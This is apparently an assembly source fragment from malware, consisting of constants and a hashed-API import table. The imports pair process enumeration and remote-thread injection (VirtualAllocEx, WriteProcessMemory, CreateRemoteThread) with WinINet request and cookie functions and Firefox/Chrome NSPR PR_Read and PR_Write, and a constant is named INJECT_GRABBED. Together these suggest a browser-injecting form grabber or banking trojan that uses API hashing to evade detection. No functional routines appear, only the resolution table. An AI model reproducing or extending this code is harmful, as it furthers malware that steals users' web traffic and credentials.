
.code

	;; Constants
	ARRAYLEN  equ 1024
	KBYTE     equ 1024
	MBYTE     equ 1024*KBYTE
	BUFFERLEN equ 2*MBYTE
	RESERVE   equ 128*KBYTE



	HTTP_REQUEST   equ 1
	HTTPS_REQUEST  equ 2
	INJECT_GRABBED equ 3



@_API_Hashes_table:
;; API Hashes table start

	;; kernel32
	_LoadLibraryA               dd 0, 05A575AE4h
	_GetModuleHandleA           dd 0, 0C02BD427h

	_CreateToolhelp32Snapshot   dd 0, 03B2EFF48h
	_Process32First             dd 0, 0D2F49D5Ah
	_Process32Next              dd 0, 0B06C2089h
	_OpenProcess                dd 0, 0684C0A05h


	_CreateFileA                dd 0, 0A2A93BE9h
	_GetFileSize                dd 0, 0CA80AE13h
	_SetFilePointer             dd 0, 006D09387h
	_ReadFile                   dd 0, 004D8BEBAh
	_WriteFile                  dd 0, 0245BD03Bh

	_CreateRemoteThread         dd 0, 03E01E6ACh
	_CreateThread               dd 0, 072A43A6Eh
	_ExitProcess                dd 0, 0D4D6F7A1h

	_VirtualAlloc               dd 0, 0C03EE45Ah
	_VirtualAllocEx             dd 0, 0CC09B795h
	_VirtualProtect             dd 0, 0CC265304h
	_VirtualProtectEx           dd 0, 01355E61Fh
	_VirtualFree                dd 0, 0D252282Fh
	_VirtualFreeEx              dd 0, 041B9B35Ah
	_WriteProcessMemory         dd 0, 0894852D9h

	_lstrcmpiA                  dd 0, 02BB2FD91h
	_lstrlenA                   dd 0, 0063E2E81h

	_CloseHandle                dd 0, 0986B3A78h
	_GetCurrentProcessId        dd 0, 01547C797h
	_WinExec                    dd 0, 000BB9A05h
	_Sleep                      dd 0, 00003B1AFh
	_ExitThread                 dd 0, 0D543F4F0h



	;; ntdll
	_RtlAdjustPrivilege         dd 0, 0EFD3AA98h
	_RtlGetLastWin32Error       dd 0, 0FEC76D6Fh
	_RtlSetLastWin32Error       dd 0, 0BB094F7Bh



	;; ws2_32
	_WSAStartup                 dd 0, 0F1AED070h
	_inet_addr                  dd 0, 02A51A274h
	_gethostbyname              dd 0, 03718CB58h
	_socket                     dd 0, 000222B6Bh
	_connect                    dd 0, 000D2E20Ah
	_send                       dd 0, 00000B0D0h
	_recv                       dd 0, 00000AF3Eh
	_closesocket                dd 0, 0B33E156Bh


	;; wininet
	_HttpAddRequestHeadersA     dd 0, 003F21E69h
	_HttpAddRequestHeadersW     dd 0, 003F21E7Fh
	_HttpQueryInfoA             dd 0, 0C542F043h
	_InternetQueryOptionA       dd 0, 0312DDA65h
	_InternetGetCookieA         dd 0, 04C581F48h

	_InternetSetStatusCallback  dd 0, 0C3F003F0h
	_InternetReadFileExA        dd 0, 0CA699E5Bh
	_HttpSendRequestA           dd 0, 0AF43415Ah
	_HttpSendRequestW           dd 0, 0AF434170h
	_InternetReadFile           dd 0, 0F268CC2Bh
	_InternetQueryDataAvailable dd 0, 09450A760h
	_HttpSendRequestExW         dd 0, 08BDF869Dh
	_InternetWriteFile          dd 0, 0A34C2E52h
	_HttpEndRequestA            dd 0, 087F01B75h
	_InternetCloseHandle        dd 0, 0E46D3CDFh


	;; nspr4 & chrome
	_PR_Write                   dd 0, 0049CBEFAh
	_PR_Read                    dd 0, 000A8A40Bh
	_PR_Close                   dd 0, 0049BFC7Bh

;; API Hashes table end
	dd 0, 0

